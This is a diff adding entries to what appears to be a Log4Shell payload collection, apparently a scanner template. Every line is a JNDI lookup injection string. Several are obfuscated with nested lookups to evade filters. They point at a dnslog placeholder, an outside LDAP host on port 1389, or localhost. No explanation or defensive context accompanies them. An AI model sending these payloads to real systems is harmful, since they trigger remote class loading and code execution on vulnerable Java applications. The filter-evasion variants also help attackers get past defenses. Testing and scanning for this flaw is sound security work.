@@ -13,4 +13,17 @@ ${${:p:q::zz::::::::-j}ndi:rmi://{{dnslog_url}}/poc}
 ${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//{{dnslog_url}}/poc}
 ${j${k8s:k5:-ND}i${sd:k5:-:}ldap://{{dnslog_url}}/poc}
 ${j${k8s:k5:-ND}${sd:k5:-${123%25ff:-${123%25ff:-${upper:1}:}}}ldap://mydogsbutt.com:1389/o}
+${jndi:ldaps://127.0.0.1/poc}
+${jndi:iiop://127.0.0.1/poc}
+${date:ldap://127.0.0.1/poc}
+${java:ldap://127.0.0.1/poc}
+${marker:ldap://127.0.0.1/poc}
+${ctx:ldap://127.0.0.1/poc}
+${lower:ldap://127.0.0.1/poc}
+${upper:ldap://127.0.0.1/poc}
+${main:ldap://127.0.0.1/poc}
+${jvmrunargs:ldap://127.0.0.1/poc}
+${sys:ldap://127.0.0.1/poc}
+${env:ldap://127.0.0.1/poc}
+${log4j:ldap://127.0.0.1/poc}
 ```
